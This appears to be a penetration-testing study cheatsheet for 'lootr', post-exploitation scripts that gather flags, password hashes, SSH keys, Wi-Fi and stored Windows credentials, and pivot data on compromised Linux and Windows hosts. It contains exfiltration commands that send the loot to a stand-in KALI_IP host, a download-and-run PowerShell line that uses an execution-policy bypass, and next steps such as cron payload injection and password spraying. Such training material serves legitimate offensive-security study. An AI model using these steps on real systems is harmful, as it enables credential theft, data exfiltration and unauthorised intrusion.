---
tags:
  - phase/postexploitation
  - topic/linux
  - topic/windows
  - tool/lootr
  - type/cheatsheet
---
# lootr — Linux + Windows Loot Collection Cheatsheet

> [!note] engagement Relevance
> Use **lootr.sh** on Linux footholds and **lootr.ps1** on Windows footholds to collect flags, credentials, privesc leads, and pivot data fast. This is **post-exploitation enumeration only**, which fits your OffSec workflow and should be run early after stable shell access.

---

## Usage

### Linux — `lootr.sh`

```bash
# Full run — use after stabilizing shell so you collect flags, creds, and privesc data early
./lootr.sh

# Custom output dir — useful when /tmp or cwd is a better write location on target
./lootr.sh --outdir /tmp/loot

# Quick mode — skip the slower process/service phase when time matters
./lootr.sh --quick

# Single phase — use when you only need one answer fast
./lootr.sh --phase proof
./lootr.sh --phase system
./lootr.sh --phase creds
./lootr.sh --phase network
./lootr.sh --phase files
./lootr.sh --phase procs
```

### Windows — `lootr.ps1`

```powershell
# Full run — best after you have a stable PowerShell session and writable disk location
.\lootr.ps1

# Custom output dir — useful when writing under current directory is messy or restricted
.\lootr.ps1 -OutDir C:\Windows\Temp\loot

# Quick mode — skips slower file/privesc enumeration when you need creds and flags first
.\lootr.ps1 -Quick

# Single phase — use to answer one question quickly instead of running everything
.\lootr.ps1 -Phase proof
.\lootr.ps1 -Phase system
.\lootr.ps1 -Phase creds
.\lootr.ps1 -Phase network
.\lootr.ps1 -Phase files
```

> [!tip] Transfer + Execution
> On Windows, this is most useful in a **PowerShell** context after you already have code execution. On Linux, run it after upgrading to a stable shell. Keep **Penelope** ready for your shell handling and stay inside **tmux**.

## Quick Decision Tree

```
Stable shell obtained?
│
├── Linux target
│   ├── Need everything now → ./lootr.sh
│   ├── Need speed first → ./lootr.sh --quick
│   └── Need one answer only → ./lootr.sh --phase <proof|system|creds|network|files|procs>
│
└── Windows target
    ├── Need everything now → .\lootr.ps1
    ├── Need creds/flags first → .\lootr.ps1 -Quick
    └── Need one answer only → .\lootr.ps1 -Phase <proof|system|creds|network|files>
```

## Output Layout

### Linux

```bash
loot/<hostname>/
├── summary.txt
├── progress.log
├── proof/
├── system/
├── creds/
├── network/
└── files/
```

### Windows

```powershell
loot\<hostname>\
├── summary.txt
├── progress.log
├── proof\
├── system\
├── creds\
├── network\
└── files\
```

## Phase Map

| Phase | Linux `lootr.sh` | Windows `lootr.ps1` | Why it matters |
|------|------|------|------|
| `proof` | Yes | Yes | Grab `local.txt` / `proof.txt` immediately and preserve path context |
| `system` | Yes | Yes | Build user, host, privilege, software, and task/service context |
| `creds` | Yes | Yes | Hunt reusable secrets, keys, histories, and privilege indicators |
| `network` | Yes | Yes | Identify internal listeners, routes, DNS, shares, and pivot opportunities |
| `files` | Yes | Yes | Surface privesc vectors, writable paths, backups, scripts, and interesting files |
| `procs` | Yes | No | Linux-only deeper process/service pass for manual follow-up |

## What Each Phase Produces

The scripts handle all collection logic. This section tells you **what to look for in the output**, not what the scripts do internally.

### Linux — `lootr.sh`

| Phase | Key output files | What you're looking for |
|-------|-----------------|------------------------|
| `proof` | `proof/local.txt`, `proof/proof.txt` | Flags — `cat`, screenshot, note path |
| `system` | `system/sudo_rights.txt`, `system/whoami.txt`, `system/id.txt` | sudo rights, group memberships, privilege context |
| `creds` | `creds/shadow_hashes.txt`, `creds/key_*`, `creds/config_files_with_creds.txt`, `creds/kerberos.txt` | Hashes to crack, SSH keys to reuse, cleartext creds, ticket material |
| `network` | `network/internal_listeners.txt`, `network/reachable_subnets.txt`, `network/hosts.txt` | 127.x services to tunnel, new subnets/hosts to target |
| `files` | `files/suid_binaries.txt`, `files/capabilities.txt`, `files/cron_jobs.txt`, `files/recently_modified.txt` | GTFOBins candidates, cap_setuid, writable cron scripts, fresh changes |
| `procs` | `procs/root_processes.txt`, `procs/services.txt` | Root-owned services to abuse, pspy candidates |

> For exploitation steps on SUID, capabilities, cron, and other Linux privesc vectors → [[Linux_PrivEsc]]

### Windows — `lootr.ps1`

| Phase | Key output files | What you're looking for |
|-------|-----------------|------------------------|
| `proof` | `proof\local.txt`, `proof\proof.txt` | Flags — `type`, screenshot, note path |
| `system` | `system\systeminfo.txt`, `system\whoami.txt`, `system\admins.txt` | Patch level, admin group membership, installed software |
| `creds` | `creds\privileges.txt`, `creds\cmdkey.txt`, `creds\autologon.txt`, `creds\wifi_passwords.txt`, `creds\putty_sessions.txt` | SeImpersonate → potato, stored creds → runas, cleartext passwords |
| `network` | `network\internal_listeners.txt`, `network\shares.txt`, `network\mapped_drives.txt`, `network\hosts.txt` | 127.0.0.1 services to tunnel, SMB shares to loot, lateral targets |
| `files` | `files\always_install_elevated.txt`, `files\unquoted_service_paths.txt`, `files\writable_service_binaries.txt`, `files\writable_path_dirs.txt`, `files\dll_hijack_candidates.txt` | Direct privesc vectors — each maps to a known technique |

> For exploitation steps on AlwaysInstallElevated, service abuse, potato attacks, and other Windows privesc vectors → [[Windows_PrivEsc]]

## Review Order After Execution

### Linux review order

```bash
HOST=$(hostname)

# 1. Start with summary because it surfaces the fastest wins
cat loot/$HOST/summary.txt

# 2. Flag confirmation and proof preservation
ls loot/$HOST/proof/

# 3. Crack / reuse / pivot material
cat loot/$HOST/creds/shadow_hashes.txt
ls loot/$HOST/creds/key_*
cat loot/$HOST/creds/config_files_with_creds.txt
cat loot/$HOST/creds/kerberos.txt

# 4. Direct privesc leads
cat loot/$HOST/system/sudo_rights.txt
cat loot/$HOST/files/capabilities.txt
cat loot/$HOST/files/suid_binaries.txt
cat loot/$HOST/files/cron_jobs.txt
cat loot/$HOST/files/recently_modified.txt

# 5. Pivot clues
cat loot/$HOST/network/internal_listeners.txt
cat loot/$HOST/network/reachable_subnets.txt
cat loot/$HOST/network/hosts.txt
```

### Windows review order

```powershell
$HOSTNAME = $env:COMPUTERNAME
$ROOT = ".\loot\$HOSTNAME"

# 1. Start with summary because it highlights immediate privesc and credential wins
Get-Content "$ROOT\summary.txt"

# 2. Flag confirmation
Get-ChildItem "$ROOT\proof"

# 3. Direct privesc checks
Get-Content "$ROOT\files\always_install_elevated.txt"
Get-Content "$ROOT\files\unquoted_service_paths.txt"
Get-Content "$ROOT\files\writable_service_binaries.txt"
Get-Content "$ROOT\files\writable_path_dirs.txt"
Get-Content "$ROOT\files\dll_hijack_candidates.txt"

# 4. Dangerous privileges and reusable creds
Get-Content "$ROOT\creds\privileges.txt"
Get-Content "$ROOT\creds\cmdkey.txt"
Get-Content "$ROOT\creds\autologon.txt"
Get-Content "$ROOT\creds\wifi_passwords.txt"
Get-Content "$ROOT\creds\putty_sessions.txt"

# 5. Pivot and lateral clues
Get-Content "$ROOT\network\internal_listeners.txt"
Get-Content "$ROOT\network\shares.txt"
Get-Content "$ROOT\network\mapped_drives.txt"
Get-Content "$ROOT\network\hosts.txt"
```

## Post-Collection Action Loop

> [!important] Do Not Let Findings Sit
> Every lootr finding maps to an immediate next action. If you finish reviewing and haven't acted on anything yet, you wasted the collection.

| Finding | Immediate action |
|---------|-----------------|
| Flags found | `cat`/`type`, screenshot with `whoami` and path, note in report — **do this first** |
| Shadow hashes | Feed to `crackr.sh` now |
| SSH keys | Test against every other known host now |
| Stored creds (cmdkey, autologon, wifi, cleartext) | Test reuse now — feed to `sprayr.sh` if AD context |
| Kerberos tickets | Import and test with `impacket` tools now |
| SeImpersonatePrivilege | Potato attack now → [[Windows_PrivEsc]] |
| SeBackupPrivilege / SeDebugPrivilege | Exploit via known paths now → [[Windows_PrivEsc]] |
| AlwaysInstallElevated | MSI payload now → [[Windows_PrivEsc]] |
| Unquoted service paths / writable service binaries | Service abuse now → [[Windows_PrivEsc]] |
| SUID / capabilities hits | Check GTFOBins now → [[Linux_PrivEsc]] |
| Writable cron jobs | Inject payload now → [[Linux_PrivEsc]] |
| sudo rights | Check GTFOBins / sudo abuse now → [[Linux_PrivEsc]] |
| Internal listeners on 127.x | Tunnel with `pivotr.sh` now |
| New subnets / hosts discovered | Add to target list, scan with `recon.sh` now |
| SMB shares / mapped drives | Enumerate for creds and data now |

## When To Use Which Mode

| Situation | Linux | Windows |
|------|------|------|
| Just landed shell and need fast wins | `./lootr.sh --quick` | `.\lootr.ps1 -Quick` |
| Need flags immediately | `--phase proof` | `-Phase proof` |
| Need reusable creds for spray / lateral movement | `--phase creds` | `-Phase creds` |
| Need pivot data | `--phase network` | `-Phase network` |
| Need privesc vectors | `--phase files` and maybe `--phase procs` | `-Phase files` |
| Want full host picture for note-taking | full run | full run |

## Common Operator Patterns

### Linux exfil

```bash
# Compress loot before transfer so you preserve structure and reduce copy pain
HOST=$(hostname)
tar czf /tmp/${HOST}_loot.tgz loot/$HOST

# HTTP pull from Kali if you can serve or fetch cleanly
curl http://KALI_IP:PORT/${HOST}_loot.tgz -o ${HOST}_loot.tgz

# SMB copy if your share is already up
cp -r loot/$HOST //KALI_IP/share/

# SCP if SSH works and creds are stable
scp -r loot/$HOST kali@KALI_IP:~/loot_${HOST}/
```

### Windows staging

```powershell
# Example transfer from Kali-served HTTP to target, then execute from temp
cd C:\Windows\Temp
iwr -Uri http://KALI_IP/lootr.ps1 -OutFile lootr.ps1
powershell -ep bypass -File .\lootr.ps1 -OutDir C:\Windows\Temp\loot
```

## Gotchas / OffSec Notes

> [!warning] Execution Context
> These scripts are **post-exploitation collection tools**, not initial enumeration tools. Run them after you already have access. Do not confuse them with your recon scripts.

> [!warning] Quick Mode Differences
> On Linux, `--quick` skips the slower **process/service** phase. On Windows, `-Quick` skips the slower **files/privesc** phase. That means a Windows quick run can miss **AlwaysInstallElevated**, **unquoted service paths**, and **DLL hijack** clues.

> [!warning] Loot Sensitivity
> The output may contain flags, hashes, private keys, Wi-Fi passwords, registry-derived creds, and ticket material. Treat the loot directory like evidence and keep host folders separated.

> [!important] High-ROI Checks
> The first files worth reviewing are usually:
> Linux: `summary.txt`, `shadow_hashes.txt`, SSH keys, `sudo_rights.txt`, `capabilities.txt`, `internal_listeners.txt`.
> Windows: `summary.txt`, `always_install_elevated.txt`, `privileges.txt`, `autologon.txt`, `cmdkey.txt`, `wifi_passwords.txt`, `unquoted_service_paths.txt`.

## Related

- [[OffSec_Exam_Methodology_Complete]]
- [[Reverse_Shells]]
- [[Linux_PrivEsc]]
- [[Windows_PrivEsc]]
- [[pivotr]]
- [[sprayr]]
- [[crackr]]
- [[servr]]
